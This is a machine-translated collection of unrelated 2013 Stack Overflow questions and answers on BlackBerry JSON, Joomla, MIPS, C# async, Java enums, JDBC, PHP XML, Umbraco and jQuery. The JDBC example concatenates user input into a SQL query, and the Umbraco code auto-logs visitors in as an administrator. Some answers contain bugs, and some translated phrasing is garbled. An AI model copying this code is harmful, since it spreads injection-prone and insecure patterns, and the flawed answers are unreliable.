> 标签：json, qml, blackberry-10

我正在为黑莓 10 开发。

我正在尝试将 JSON 数据模型保存并加载到我的应用程序的列表视图中。它最初通过 app.cpp 文件中的几行 C++ 加载，然后将控制权切换到 QML 文件。但是，我不知道如何将新单元格保存到这个 JSON 数据库中。保存后我不知道如何重新加载 ListView。最后，我不知道我可以和不能在 JSON 数据库中保存什么的限制。任何人都可以提供一些帮助吗？我应该使用 JSON 模型还是应该是 QML 甚至是 XML？感谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T15:59:14.190

有关您在此处所做的事情的更多信息将有助于提供答案。JSON 是一种用于在字符串中包含和表示对象的格式，它不是数据库。通常使用 ListView 需要创建一个包含您的数据并由 ListView 呈现的 ListModel。使用 ListModel 时，您可以访问[http://harmattan-dev.nokia.com/docs/library/html/qt4/qml-listmodel.html](http://harmattan-dev.nokia.com/docs/library/html/qt4/qml-listmodel.html)中记录的各种功能。尽管我建议发布您的代码以使一切都清楚，但您的问题尚不清楚您实际上在做什么。

# joomla - 将语言常量添加到 Joomla 组件 javascript

> ID：16122021
> 
> 赞同：6
> 
> 时间：2013-04-20T15:27:10.590
> 
> 标签：joomla, joomla2.5

我的组件包含一个 java 脚本文件：

```
$doc->addScript("/components/com_cam/js/cam.js"); 
```

我有几个客户端消息，我想用语言常量添加，即

```
<?php echo JText::_('COM_CAM_SEND_LABEL'); ?> 
```

在您的前端 php 代码（如 default.php）中很容易，但里面的消息`cam.js`呢？

比如我的jquery验证：

```
 messages: {
            cam: {
                required: "Enter a label",
                minlength: jQuery.format("At least {0} characters required!"),
                maxlength: jQuery.format("Maximum {0} characters allowed!")
            }
        } 
```

对此的最佳做法是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-21T22:41:51.980

在 Joomla！2.5（我相信从 1.6 开始）[`JText::script()`](http://docs.joomla.org/JText%3a%3ascript/1.6)增加了对向全局添加语言键的支持，`array()`以便您的 Javascript 可以访问它们。

首先，在您的 PHP 中，您可以调用`JText::script('COM_MYCOMPONENT_MSG1');`需要在 Javascript 中翻译的每个字符串。

`Joomla.JText._('COM_MYCOMPONENT_MSG1')`您可以使用Javascript 中的内置功能来检索它。

当您到达需要转换大量字符串的地步时，您可能会发现在运行时解析 javascript 文件更容易（效率低下 yada yada 但对于后端管理屏幕来说并不是什么大问题）。

```
/**
 * Parses a javascript file looking for JText keys and then loads them ready for use.
 *
 * @param   string  $jsFile  Path to the javascript file.
 *
 * @return bool
 */
public  static function loadJSLanguageKeys($jsFile)
{
    if (isset($jsFile))
    {
        $jsFile = JPATH_SITE . $jsFile;
    }
    else
    {
        return false;
    }

    if ($jsContents = file_get_contents($jsFile))
    {
        $languageKeys = array();
        preg_match_all('/Joomla\.JText\._\(\'(.*?)\'\)\)?/', $jsContents, $languageKeys);
        $languageKeys = $languageKeys[1];

        foreach ($languageKeys as $lkey)
        {
            JText::script($lkey);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-21T16:19:17.257

创建一个辅助函数来构建验证消息并将其添加到`head`.

像下面这样，只需编辑它以满足您的需要

```
$messages = '(function ($) {
    $.extend($.validator.messages, {
            cam: {
                required: "' . JText::_('COM_CAM_VALIDATION_REQUIRED') . '",
                minlength: jQuery.format("' . JText::_('COM_CAM_VALIDATION_MINIMUM') . '"),
                maxlength: jQuery.format("' . JText::_('COM_CAM_VALIDATION_MAXIMUM') . '")
            }
        });
}(jQuery));';

$doc = JFactory::getDocument();
$doc->addScriptDeclaration($messages); 
```

# mips - qtspim 的 MIPS 代码

> ID：16122024
> 
> 赞同：-1
> 
> 时间：2013-04-20T15:27:26.450
> 
> 标签：mips, spim

您好，我正在尝试调试此代码。它为其寄存器提供了错误的值。该代码用于测试一些简单的算术运算并将值存储在不同的寄存器中。谢谢您的帮助！

```
.ent main
main:
addi $a0, $0, 10        # r4 = 0 + 10
addi $a1, $0, 1         # r5 = 0 + 1
sltiu $s1, $a1, 2       # set if a1 < 2
add  $t0, $t0, $0       # $t0 = 0
add $t1, $t1, $a1       # $t1 = $a1 (t1 = 1)

$count:
add $t0, $t0, $t1       # $t0 = $t0 + $t1   (t0 += 1)
slti $s1, $t0, 10       # if(a1 < 10) s1 = 1 else s1 = 0

beq $s1, $a1, $count    # while to < 10
sub $s1, $s1, $a0       # s1 = s1 - a1
and $s1, $s1, $a0       # s1 = s1 $ a0
or  $s2, $0, $s1        # s2 = 0 | a0

j $store                # store result

$recount:
sub $s1, $s1, $a1       # t0 = 0

$store: 
sw $s1,0($29)           # store s1 on stack
slti $t3, $s1, 0        # if s1 < 0
beq $s1, $0, $recount   # goto recount
lui $t3, 5              # load 5 into $t3
slt $s3, $t3, $t0       # if t3 < t0
beq $s1, $0, $end       # goto end
add $t0, $t0, $0        # t0 = 0
sw $s1, 0($29)          # store $s3 in $s1
lw $s4, 4($29)          # pop stack

$end:
jr $31
.end main 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-23T14:33:55.313

我不确定错误在哪里，但在这些情况下，注释和代码不对应：

1

```
add  $t0, $t0, $0       # $t0 = 0 
```

应该

```
li $t0, 0       # $t0 = 0 
```

2

```
add $t1, $t1, $a1       # $t1 = $a1 (t1 = 1) 
```

应该

```
move $t1, $a1       # $t1 = $a1 (t1 = 1) 
```

3

```
sub $s1, $s1, $a1       # t0 = 0 
```

应该

```
li $t1, 0       # t0 = 0 
```

4

压栈是

```
addi $sp, $sp, -4
sw $t0, 0($sp) 
```

弹出：

```
lw $t0, 0($sp)
addi $sp, $sp, 4 
```

如果您可以提供更多关于哪里出了问题的详细信息，我们可以提供更好的帮助。

# matlab - 修改二维数组的元素是条件满足matlab

> ID：16122025
> 
> 赞同：0
> 
> 时间：2013-04-20T15:27:34.423
> 
> 标签：matlab

当 BW 的元素为零时，我想用数组“a”的元素替换数组 BW 的元素。这是我写的代码

`for i=0:row` `for j=0:col`
`if BW(i,j)==0` `BW(i,j)=a(i,j);` `end`
结束结束

如果 BW(i,j)=0 我得到错误

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T15:33:24.503

简单的方法是：

```
BW(find(BW == 0)) = a(i,j) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:01:15.303

不需要循环。

索引中的零元素，`BW`然后用相应的元素替换`a`

```
idx = BW == 0;
BW(idx) = a(idx); 
```

该解决方案假设`a`至少与`BW`

# algorithm - 算法和编程复杂性

> ID：16122029
> 
> 赞同：1
> 
> 时间：2013-04-20T15:27:54.127
> 
> 标签：algorithm, complexity-theory

如果应用程序停止从内存数据结构中读取，而是从外部存储上实现的词汇表读取到主内存，这将如何影响算法和编程复杂性？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T18:02:51.680

它不会改变算法的复杂性，除非您需要实现额外的算法来执行您的外部存储协议（通常情况并非如此）。

为了支持附加功能，编程复杂性可能会增加（尽管它很可能可以忽略不计）。

# c# - 如何做整个功能而不仅仅是一半？

> ID：16122030
> 
> 赞同：0
> 
> 时间：2013-04-20T15:27:57.280
> 
> 标签：c#, asynchronous, microsoft-metro, async-await

我目前正在为 Windows Store 编写 C# 应用程序。

我有 Cache 类、News UserControl 类和 MainPage 类

我在 MainPage 构造函数 Cache 类中调用，然后为 News 类调用 InitializeData，在该类中我使用来自 Cache 的数据，但是有问题，在 Cache 构造函数中我接收数据但他没有执行整个函数，他在第三个从 Cache 构造函数切换到 InitializeData等待功能。

主页：

```
public MainPage()
{
    this.InitializeComponent();

    Cache.Cache cache = new Cache.Cache();
    NewsContent.InitializeData(cache.MyData);
} 
```

缓存：

```
 public Cache()
    {
        Initialization = Init();
    }

    public Task Initialization
    {
        get;
        private set;
    }

    private async Task Init()
    {
        try
        {
            cS        = await folder.CreateFileAsync("cache.txt", CreationCollisionOption.OpenIfExists);
            cS_titles = await folder.CreateFileAsync("titles_cache.txt", CreationCollisionOption.OpenIfExists);

            string contentOfFile = await FileIO.ReadTextAsync(cS);
            int contentLength = contentOfFile.Length;

            if (contentLength == 0) // download data for first using
            {
                await debug.Write("Is empty!");

                //.......
                // ....

                await FileIO.AppendTextAsync(cS, file_content);
                await FileIO.AppendTextAsync(cS_titles, file_content_titles);
            }
            else // check for same data, if isnt same download new, else nothing
            {
                await debug.Write(String.Format("Isnt empty. Is long: {0}", contentLength)); // here he break and continue to NewsContent.InitializeData(cache.MyData);

                // ....
                // ....
            }

            await MyFunction(); // i need get constructor to this point then he will do NewsContent.InitializeData(cache.MyData);
        }
        catch (Exception)
        {

        }
    } 
```

这有可能做到吗？任何想法谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T17:32:21.523

[Stephen Cleary 关于`async`和构造函数](http://blog.stephencleary.com/2013/01/async-oop-2-constructors.html)的文章描述了如何进行这项工作。

在您的情况下，我认为工厂模式（如 Jon 的回答中所建议的）不适用于`MainPage`，因为它是一个 GUI 组件。但是第二种方法，异步初始化模式，将起作用。

您已经为 实现了该模式`Cache`，现在您还需要为 实现它`MainPage`：

```
public MainPage()
{
    Initialization = InitializeAsync();
}

public Task Initialization { get; private set; }

private async Task InitializeAsync()
{
    Cache.Cache cache = new Cache.Cache();
    await cache.Initialization;
    NewsContent.InitializeData(cache.MyData);        
} 
```

如果`MainPage`有一些依赖于初始化完成的事件，您可以在它们的开头进行然后`async`添加。`await this.Initialization`此外，您可能希望在`MainPage`'s的末尾启用按钮或类似的东西`InitializeAsync()`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T15:31:59.593

基本上，当您调用异步方法并且从不等待它完成时，就会发生这种情况。

异步方法的全部意义在于您*不会*阻塞......并且您的构造函数本身不能是异步的。

一种选择是编写一个异步静态方法来创建缓存：

```
static async Task<Cache> CreateCache()
{
    // Change your InitializeData to return the data which the cache needs
    var data = await InitializeData();
    return new Cache(data);
} 
```

从根本上讲，您仍然需要调用 CreateCache 来了解它是异步发生的。您不想阻止 UI 线程等待它全部初始化。

编辑：我没有发现这是从`MainPage`构造函数中调用的。您可能会再次应用相同的方法：

```
public static async Task<MainPage> CreateMainPage()
{
    var cache = await Cache.CreateCache();
    return new MainPage(cache);
} 
```

这是假设您真的，真的不能在没有完全初始化缓存的情况下创建主页。如果你*能*处理它（例如，在完成初始化之前显示类似“正在加载...”的状态），那会更好。

# ios - 将动画限制为父视图

> ID：16122031
> 
> 赞同：1
> 
> 时间：2013-04-20T15:28:01.703
> 
> 标签：ios, animation, uiview, uitableview

我有一个 UITableViewCell，我为它的内容设置动画。但我想限制动画，以便当文本超出 UITableViewCell 时，它在 ViewController 中不可见。

动画本身很简单：

```
[UIView animateWithDuration:0.3 delay:0 options:0 animations:^
     {
       yesNew.origin.x += 200;
       noNew.origin.x += 200;
       ansLblNew.origin.x = -210;

      [yesButton setFrame:yesNew];
       [noButton setFrame:noNew];
       [answerLabel setFrame:ansLblNew];

     }completion:^(BOOL finished){
       [yesButton setHidden:YES];
       [noButton setHidden:YES];
       [answerLabel setHidden:YES];
     }]; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T15:36:40.487

尝试将您的单元格的 clipToBounds 设置为 YES（如果您在代码中执行此操作），或选中 IB 中的“剪辑子视图”复选框（在属性检查器的“视图”部分中）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T17:54:32.227

您如何将这些子视图添加到您的`UITableViewCell`? 你要添加它们`cell.contentView`吗？如果是这样，您应该可以设置`cell.contentView.clipsToBounds = YES`. 过去，当我尝试设置`clipsToBounds`单元本身时，我经历过奇怪的行为。或者，您是否尝试过设置`myTableView.clipsToBounds=YES`？这是未经测试的，但它可能会奏效。

# mamp - 使用 Codekit 覆盖文件时权限被拒绝

> ID：16122032
> 
> 赞同：3
> 
> 时间：2013-04-20T15:28:04.093
> 
> 标签：mamp, virtualhost, overwrite, permission-denied, codekit

使用 MAMP Pro，我为运行 Codekit ( [http://incident57.com/codekit](http://incident57.com/codekit) ) 的站点设置了一个虚拟主机，以将 LESS 文件自动编译到其目录。我已将主机的所有者设置为 www，但这会以某种方式干扰 Codekit 的首选项，并且在编译时它无法覆盖任何文件（应用程序显示“EACESS，权限被拒绝”错误）。尝试了几种为不同文件夹设置文件权限的方法，但均未成功。想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-07T00:58:49.390

您应该将项目文件存在于磁盘上的实际文件夹添加到 CodeKit，而不是 Mamp 设置的虚拟主机。

# java - Java Platformer 与平台的冲突

> ID：16122040
> 
> 赞同：0
> 
> 时间：2013-04-20T15:29:06.927
> 
> 标签：java, collision

我急需帮助。我花了 3 个小时来解决我不知道如何让我与一个单一平台发生碰撞这一事实！

我希望玩家能够在平台上跳跃而不会在平台上出现故障或跌倒。但是，也有玩家举起左箭头键或右箭头键接触到平台边缘的情况！我真的需要您的帮助，了解如何使与平台碰撞的简单方面与我的代码一起工作。

这是我的代码：

```
import java.applet.Applet;
import java.awt.Color;
import java.awt.Graphics;
import java.awt.Image;
import java.awt.Rectangle;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;

public class Form1 extends Applet implements Runnable, KeyListener
{
private Image dbImage;
private Graphics dbg;

Thread t1;

int x = 300;
int y = 300;

boolean jumping = false;
double yVel = 0;
double termVel = 10;
int loop_cnt = 0;
int start_cnt = loop_cnt;
boolean falling = false;
boolean left, right, up, down;
double counter2 = 4;
int counter;
int num = 7;
int prevY = y;
int prevX = x;
int d = 0;
Rectangle player;

Rectangle platform;

public void init()
{
    setSize(600, 400);
}

public void start()
{
    player = new Rectangle();

    platform = new Rectangle();
    addKeyListener(this);
    t1 = new Thread(this);
    t1.start();
}

public void stop()
{
}

public void destroy()
{
}

@Override
public void run()
{
    while (true)
    {

        //this code will be used if the player is on a platform and then walks off it by pressing either right or left
        if (y <= 300 && !up)
        {
            y += 10;
        }

        if (left)
        {
            prevX = x;
            x -= 2;
        }

        if (right)
        {
            prevX = x;
            x += 2;
        }
        if (up)
        {
            counter2 += 0.05;
            prevY = y;
            y = y + (int) ((Math.sin(counter2) + Math.cos(counter2)) * 5);

            if (counter2 >= 7)
            {
                counter2 = 4;
                up = false;
            }
        }
        if (y >= 300)
        {
            falling = false;
            y = 300;
        }

        repaint();

        try
        {
            t1.sleep(17);
        } 
        catch (InterruptedException e)
        {
            e.printStackTrace();
        }
    }
}

public Rectangle IntersectPlatform()
{
    return platform;
}

public void update(Graphics g)
{
    dbImage = createImage (this.getSize().width, this.getSize().height);
    dbg = dbImage.getGraphics();
    // initialize buffer
    if (dbImage == null)
    {
    }

    // clear screen in background
    dbg.setColor(getBackground());
    dbg.fillRect(0, 0, this.getSize().width, this.getSize().height);

    // draw elements in background
    dbg.setColor(getForeground());
    paint(dbg);
    // draw image on the screen
    g.drawImage(dbImage, 0, 0, this);
}

public void paint(Graphics g)
{
    String string = String.valueOf(y);

    g.setColor(Color.RED);

    g.fillRect(x, y, 40, 100);

    player.setBounds(x, y, 40, 100);

    g.setColor(Color.BLUE);

    platform.setBounds(180, 300, 100, 40);
    g.fillRect(180, 300, 100, 40);

    g.drawString(string, 100, 100);
}

@Override
public void keyPressed(KeyEvent e)
{
    switch (e.getKeyCode())
    {
    case KeyEvent.VK_RIGHT:

        right = true;
        break;
    case KeyEvent.VK_LEFT:
        left = true;
        break;
    case KeyEvent.VK_UP:
        up = true;
        break;
    case KeyEvent.VK_DOWN:
        down = true;
        break;
    }
}

@Override
public void keyReleased(KeyEvent e)
{
    switch (e.getKeyCode())
    {
    case KeyEvent.VK_RIGHT:
        right = false;
        break;
    case KeyEvent.VK_LEFT:
        left = false;
        break;
    case KeyEvent.VK_UP:
        break;
    case KeyEvent.VK_DOWN:
        down = false;
        break;
    }
}

@Override
public void keyTyped(KeyEvent arg0)
{
    // TODO Auto-generated method stub

} 
```

}

# java - 枚举不能用于固定常量？

> ID：16122041
> 
> 赞同：0
> 
> 时间：2013-04-20T15:29:09.647
> 
> 标签：java, enums

我正在使用以下定义固定的常量集

```
private enum MENU_OPTIONS {
   MENU_SEND_SMS,
   MENU_COPY_SMS,
   MENU_ADD_SMS,
   MENU_POST_FACEBOOK,
   MENU_TWEET
} 
```

我有一个接受 INT 的方法

```
menu.add (int, int, int, String); 
```

所以当我向上述方法提供“MENU_OPTIONS.MENU_SEND_SMS”时，它会报告错误

```
menu.add(0, MENU_SEND_SMS, 0, ); // error: The method add(int, int, int, CharSequence) in the type Menu is not applicable for the arguments (int, FavoriteSMSFragment.MENU_OPTIONS, int, String) 
```

那么如果我想使用一组固定的常量，我应该如何定义 ENUM？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T15:33:56.253

枚举是一个类。`MENU_OPTIONS.MENU_SEND_SMS`is的类型`MENU_OPTIONS`（因为它是一个代表单个菜单选项的类，所以应该命名为`MenuOption`）。

因此，您的`add()`方法应该采用 type 参数`MenuOption`而不是 type 参数`int`。这更安全，因为它记录了方法的期望（int 比 MenuOption 模糊得多），并且因为除了枚举中定义的值之外，您将无法传递任何值（而任何无效的 int 值可能是传递给以 int 作为参数的方法）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-20T15:36:06.143

java 中的枚举与 C 或 C++ 中的枚举不同。它们本质上归结为一个类的静态实例。[这篇文章很好地解释了它并带有示例](http://docs.oracle.com/javase/1.5.0/docs/guide/language/enums.html)。我相信你需要`MENU_SEND_SMS.ordinal()`你现在这样做的方式，但你可能会通过像他们一样使用枚举作为一个类来做得更好（如我链接的文档中的示例）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-20T15:32:20.160

在 Java 中，枚举更像是类的命名实例。[枚举](http://docs.oracle.com/javase/tutorial/java/javaOO/enum.html)类型是一种特殊的数据类型，它使变量能够成为一组预定义的常量。`MENU_SEND_SMS`是类型`MENU_OPTIONS`。它不是原始类型。它不像 C 等其他语言中使用的那样`int`工作。`enums`

**你可以做三件事：**

1) 改变参数的类型

```
menu.add (int, MENU_OPTIONS, int, String); 
```

2）如果您仍然维持现有的方法定义：

```
menu.add (int, int, int, String); 
```

然后调用为：

```
MENU_OPTIONS option = MENU_OPTIONS.MENU_SEND_SMS
menu.add(0, option.ordinal(), 0, "someString"); 
```

3）将枚举定义为：

```
public enum MENU_OPTIONS {
      MENU_SEND_SMS(0),
      MENU_COPY_SMS(1),
      MENU_ADD_SMS(2),
      MENU_POST_FACEBOOK(3),
      MENU_TWEET(4);

     private final int option;
     private MENU_OPTIONS (int option) {
        this.option= option;
     }

     public int getOption() {
        return option;
    }
 } 
```

并将其用作：

```
menu.add(0, MENU_OPTIONS.MENU_SEND_SMS.getOption(), 0, "someString"); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-20T15:32:58.470

```
System.out.println(MENU_OPTIONS.MENU_ADD_SMS); 
```

它将打印**MENU_ADD_SMS**（类型`MENU_OPTIONS`）

您可能希望`ENUM`通过使用**[ordinal()](http://docs.oracle.com/javase/1.5.0/docs/api/java/lang/Enum.html#ordinal%28%29)**从 中获取 int 值：

`System.out.println(MENU_OPTIONS.MENU_ADD_SMS.ordinal());`

现在它将打印**2**，作为方法除外。

或者，头韵，您可以更改方法，以便它接受 an`MENU_OPTION`而不是`int`.

# java - 无法找到或加载主类 test.Test

> ID：16122045
> 
> 赞同：-1
> 
> 时间：2013-04-20T15:29:16.963
> 
> 标签：java

```
package test;

import java.sql.*;
import java.util.Scanner;

public class Test {

    public static void main(String[] args) {
        try{
            Scanner sc = new Scanner(System.in);
            Connection con = DriverManager.getConnection("jdbc:mysql://localhost/database", "root", "root");
            Statement stmt = (Statement) con.createStatement();
            System.out.print("Enter name to search");
            String name = sc.next();
            String query = "SELECT * FROM Contacts WHERE first_name = '" + name + "' ;";
            ResultSet rs = stmt.executeQuery(query);

            while(rs.next()){
                System.out.println("Last_Name: " + rs.getString("last_name"));
                System.out.println("First_Name: " + rs.getString("first_name"));
                System.out.println("Email: " + rs.getString("email"));
                System.out.println("Phone: " + rs.getString("mobile_phone"));

            }
        } catch(Exception e){
            System.out.println("ERROR: " + e.
     } 
```

我将 jdbc.jar 导入到项目库中，但仍然出现错误：

```
Could not find or load main class test.Test 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T15:39:54.847

你在使用一些IDE吗？你的类在“test”包中，所以如果你想直接从命令行执行你的程序，你应该进入 test 的父文件夹，然后启动：

> java test.Test

# php - 如何让php读取xml文档？

> ID：16122049
> 
> 赞同：-1
> 
> 时间：2013-04-20T15:30:08.283
> 
> 标签：php, xml, parsing, variables

我需要一些 php 代码来读取这个 XML，并获取`<title>` 标签的内容并声明为`$title`变量。和as和变量`<tags>`也一样。`<content>``$tags``$content`

XML 如下所示：

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<page>
    <title>Example title</title>
    <tags>example,title,page</tags>
    <content>This page has some lovely example content</content>
</page> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T15:35:31.223

这已经在 stackoverflow 上讨论过很多次了，尝试了解[simplexml](http://php.net/manual/en/function.simplexml-load-string.php)。你需要加载文件然后在里面循环

```
$data = simplexml_load_string($xml);
foreach($data as $key => $val)
    echo "$key=>$val" . "<br>"; 
```

现场工作样本 - > [http://codepad.viper-7.com/6r1Tnd](http://codepad.viper-7.com/6r1Tnd)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T15:31:50.643

您需要阅读[loadXML](http://php.net/manual/en/domdocument.loadxml.php)。该链接描述了这个函数，并给出了一些关于如何使用它的示例代码。

# c# - ManualResetEvent 可能的竞争条件

> ID：16122051
> 
> 赞同：4
> 
> 时间：2013-04-20T15:30:17.207
> 
> 标签：c#, multithreading

问题：

我试图从 ThreadPool 中抛出 6 个线程来处理单个任务。每个任务的 ManualResetEvent 都存储在手动复位事件数组中。线程数对应于 ManualResetEvent Array 中的索引。

现在发生的情况是，一旦我启动了这 6 个线程，我就会离开并等待线程完成。等待线程在主线程中完成。

现在有时会发生的是，即使经过很长时间（我见过的 2 天），我的等待逻辑也不会返回。这是线程等待逻辑的代码示例

```
 foreach (ManualResetEvent whandle in eventList)
                {
                    try
                    {
                        whandle.WaitOne();
                    }
                    catch (Exception) { }
                } 
```

根据 .WaitOne 的文档。如果未从线程接收到 Set 事件，则同步调用使线程不返回。

有时我的线程工作量较少，它们甚至可能在我到达等待逻辑之前返回。.WaitOne() 是否有可能会等待 Set() 事件，即使它是过去收到的？这是等待所有线程关闭的正确逻辑吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-20T16:01:21.190

我不是直接回答这个问题。这是你*应该*做的：

使用启动任务`Task.Factory.StartNew`并使用`Task.WaitAll(Task[])`等待它们。您不必以这种方式处理事件。异常会很好地传播到“分叉”线程。您不再需要旧的`ThreadPool`API。

希望这可以帮助。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-20T15:46:39.380

*（注意：我认为您最好的选择是`Parallel.Invoke()`- 请参阅此答案的后面部分。）*

您所做的通常可以正常工作，因此问题很可能是您的一个线程由于某种原因而阻塞。

您应该能够很容易地调试它 - 您可以附加调试器并中断程序，然后查看调用堆栈以查看哪些线程被阻塞。但是，如果您发现比赛条件，请准备好一些令人头疼的事情！

要注意的另一件事是您*不能*执行以下操作：

```
myEvent.Set();
myEvent.Reset(); 
```

`.Set()`在和之间没有任何东西（或很少）`.Reset()`。如果您在多个线程等待时这样做`myEvent`，其中一些将错过正在设置的事件！（这种效果在 MSDN 上没有很好的记录。）

顺便说一句，你不应该忽略异常——至少总是以某种方式记录它们。

* * *

*（本节不回答问题，但可能会提供一些有用的信息）*

我还想提到另一种等待线程的方法。由于您有一组 ManualResetEvents，您可以将它们复制到一个普通数组并将其传递给[`WaitHandle.WaitAll()`](http://msdn.microsoft.com/en-gb/library/system.threading.waithandle.waitall.aspx).

您的代码可能看起来像这样：

```
WaitHandle.WaitAll(eventList.ToArray()); 
```

等待所有线程完成的另一种方法是使用[`CountdownEvent`](http://msdn.microsoft.com/en-us/library/system.threading.countdownevent.aspx). 当倒计时达到零时，它会发出信号；您从线程数开始计数，每个线程在退出时都会发出信号。[这里](https://stackoverflow.com/questions/6790499/how-do-i-have-my-method-wait-for-all-threads-to-finish)有一个例子。

[**`Parallel.Invoke()`**](http://msdn.microsoft.com/en-us/library/system.threading.tasks.parallel.invoke.aspx)

如果您的线程不返回值，而您只想启动它们，然后让启动线程等待它们退出，那么我认为这`Parallel.Invoke()`将是最好的方法。它避免了您必须自己处理同步。

（否则，正如 svick 在上面的评论中所说，使用`Task`而不是旧的线程类。）

# c# - c# 虚拟鼠标移动和点击。不移动使用中的真实光标

> ID：16122054
> 
> 赞同：2
> 
> 时间：2013-04-20T15:30:31.870
> 
> 标签：c#, mouse

我希望能够在不使用真实鼠标的情况下模拟鼠标的移动和点击。将使用虚拟鼠标，因为即使我的应用程序启动 10 个进程也必须能够在不同的窗口中执行每个移动和单击。谢谢

更新“我的意思是幽灵鼠标，因为我启动的每个进程都必须有个人鼠标”

# internet-explorer - 仅在使用 Internet Explorer 时重定向到登录 Umbraco

> ID：16122057
> 
> 赞同：2
> 
> 时间：2013-04-20T15:30:47.213
> 
> 标签：internet-explorer, authentication, umbraco, response.redirect

我有一个宏，可以检测访问者是否来自 Facebook，以及该访问者是否是该 facebook 页面上的管理员。

当我检测到管理员时，我运行以下代码以将访问者作为预定义管理员（Umbraco 后端用户）登录并重定向到实时编辑模式。**这在 Chrome 中完美运行，但在 Internet Explorer 中不起作用。**在 Internet Explorer 中，访问者在顶层（iframe 之外）被重定向到 Umbraco 登录页面，而不是登录。知道为什么吗？

```
var id = umbraco.BusinessLogic.User.getUserId("exampleadminuser"); // LoginName of an administrator
var u = umbraco.BusinessLogic.User.GetUser(id);
umbraco.BasePages.BasePage.doLogin(u);

// Check if the user should be redirected to live editing
if (u.DefaultToLiveEditing)
{

    int startNode = u.StartNodeId;

    // If the startnode is -1 (access to all content), we'll redirect to the top root node
    if (startNode == -1)
    {
        if (umbraco.cms.businesslogic.web.Document.GetRootDocuments().Length > 0)
            {
            startNode = umbraco.cms.businesslogic.web.Document.GetRootDocuments()[0].Id;
        }
        else
        {
            throw new Exception("There's currently no content to edit. Please contact your system administrator");
        }
    }

    string redir = String.Format("{0}/canvas.aspx?redir=/{1}.aspx", GlobalSettings.Path, startNode);
    Response.Redirect(redir, true);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-22T09:20:24.180

众所周知，canvas.aspx 功能不可靠且受补丁支持，因此如果一个浏览器的反应不同也就不足为奇了。在我的 2 级 Umbraco 证书课程中，导师和房间里的每个人都同意它还没有准备好生产。

我无法完全复制您的问题，但在最新版本的 Chrome、Firefox 和 IE9 中登录后台时，Chrome 是奇怪的——IE9 和 Firefox 的反应方式相同。对我来说奇怪的是 Chrome 是唯一一个**不**工作的。

我正在登录 umbraco，然后在每个实例中使用 url 启动另一个选项卡：

<..域..>/canvas.aspx?redir=/pagename/

（我的网站将 umbracoUseDirectoryUrls 键设置为 true，因此 .aspx 格式被尾部斜杠替换）。

所以我的回答是 canvas.aspx 不可靠，因此我会将管理员登录到标准的 /umbraco/ 后台而不是信任 canvas.aspx。

# jquery - 如何在一个函数中为多个数组定义不同的选项？

> ID：16122058
> 
> 赞同：2
> 
> 时间：2013-04-20T15:30:57.730
> 
> 标签：jquery

这是我的第一个 stackoverflow 问题，我希望我没有错过任何相关主题，但是我还没有找到答案。我一直在摆弄一个（可能很简单）jquery 任务，但我被卡住了。而且，嗯，我当然是 jquery 的新手，所以请善待 :-)

我想做一个简单的闪烁词多云的事情，其中​​不同的词组（列表项）随着*单独的延迟*淡入淡出。我让它与一个简单的函数一起工作，我为三个组中的每一个调用了三次。我想知道是否有一种方法可以组合这三个函数，但仍然为每个单词数组定义一个单独的延迟。

这是我的小提琴：http: [//jsfiddle.net/alani/eHthD/](http://jsfiddle.net/alani/eHthD/)

也许没有办法将所有内容放在一个函数中，使用长版本完全可以？我不知道。这对我来说似乎完全没有效率......

为了快速查看这里是我的功能之一：

```
var wordIndex = -1;

(function () {

    var words1 = $(".cloud1");
    function showNextWord() {

        ++wordIndex;
        words1.eq(wordIndex % words1.length)
            .fadeIn(500)
            .delay(1000)
            .fadeOut(1000, showNextWord);
    }

    showNextWord();

})(); 
```

这是我清单的一部分

```
<ul>
<li class="cloud1">smoke</li>
<li class="cloud1">denim</li>
<li class="cloud1">eyebrow</li>

<li class="cloud2">angle</li>
<li class="cloud2">staple</li>
<li class="cloud2">basket</li>
... 
```

谢谢大家！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T15:41:44.363

如果不让代码变得更复杂，你就不能真正做你想做的事。但是，您可以尝试使用通用功能来完成工作...

```
function beginCloud($obj, delay) {

    var wordIndex = -1;
    var showNextWord = function() {

        ++wordIndex;
        $obj.eq(wordIndex % $obj.length)
            .fadeIn(500)
            .delay(delay)
            .fadeOut(1000, showNextWord);
    }

    showNextWord();

}

beginCloud( $('.cloud1', 1000) );
beginCloud( $('.cloud2', 2000) );
beginCloud( $('.cloud3', 3000) ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-20T16:13:23.403

我制作了一个稍微复杂一点的版本，但是，它允许您只向文档中添加新元素，而无需更新 JavaScript。

这是代码：

```
var wordIndexes = {};

$(function() {
    num_groups = 0;
    $('ul.cloud').each(function() {
        var group = $(this).data('group');
        wordIndexes[group] = -1;
        num_groups = (group > num_groups) ? group : num_groups;
    });

    for (n=1; n <= num_groups; ++n) {
        (function(i) {
          var words = $('ul.cloud[data-group="' + i + '"] li');

          function showNextWord() {
            ++wordIndexes[i];
            words.eq(wordIndexes[i] % words.length)
